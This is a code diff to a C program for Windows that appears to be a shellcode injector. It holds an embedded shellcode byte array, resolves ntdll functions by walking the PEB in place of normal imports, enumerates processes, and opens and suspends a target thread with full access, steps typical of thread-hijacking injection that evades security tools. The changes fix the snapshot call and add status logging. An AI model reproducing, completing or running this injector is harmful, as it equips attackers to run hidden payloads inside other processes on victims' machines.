@@ -7,6 +7,8 @@
 #define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
 #define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
 #define STATUS_SUCCESS 0x00000000
+#define TH32CS_SNAPPROCESS 0x00000002
+#define TH32CS_SNAPTHREAD
 #define THREAD_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | SPECIFIC_RIGHTS_ALL)
 
 
@@ -70,6 +72,9 @@ unsigned char buf[] =
 "\xbe\x61\xec\x56\x07\xa3\x8b\x40\x54\x60\xe6\x5d\x33\xe8"
 "\xb8\x43";
 
+
+
+
 size_t GetModHandle(wchar_t *ln) {
 	PEB* pPeb = (PEB*)__readgsqword(0x60);
 	PLIST_ENTRY header = &(pPeb->Ldr->InMemoryOrderModuleList);
@@ -132,7 +137,14 @@ size_t GetFuncAddr(size_t modb, char* fn) {
 }
 
 
+void statchecker(NTSTATUS check){
 
+	if(check == STATUS_SUCCESS){
+
+		g("status success");
+	}
+
+}
 
 int main(int argc, char** argv, char* envp) {
 	size_t kb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");
@@ -166,7 +178,7 @@ int main(int argc, char** argv, char* envp) {
 	PROCESSENTRY32 dw;
 	dw.dwSize = sizeof(dw);
 
-	HANDLE snap = ((HANDLE(WINAPI*)(DWORD, DWORD))ptr_CreateToolhelp32Snapshot)(dw, dw.dwSize);
+	HANDLE snap = ((HANDLE(WINAPI*)(DWORD, DWORD))ptr_CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
 
 	if(((BOOL(WINAPI*)(HANDLE, LPROCESSENTRY32))ptr_Process32First)(snap, &dw)==TRUE){
 		while  (((BOOL(WINAPI*)(HANDLE, LPROCESSENTRY32))ptr_Process32Next)(snap, &dw) == TRUE){
@@ -181,6 +193,8 @@ int main(int argc, char** argv, char* envp) {
 
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG))ptr_NtOpenThread)(hThread, THREAD_ALL_ACCESS, &oa ,0);
+
+	statchecker(status);
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtSuspendThread)(hThread, &n);
 
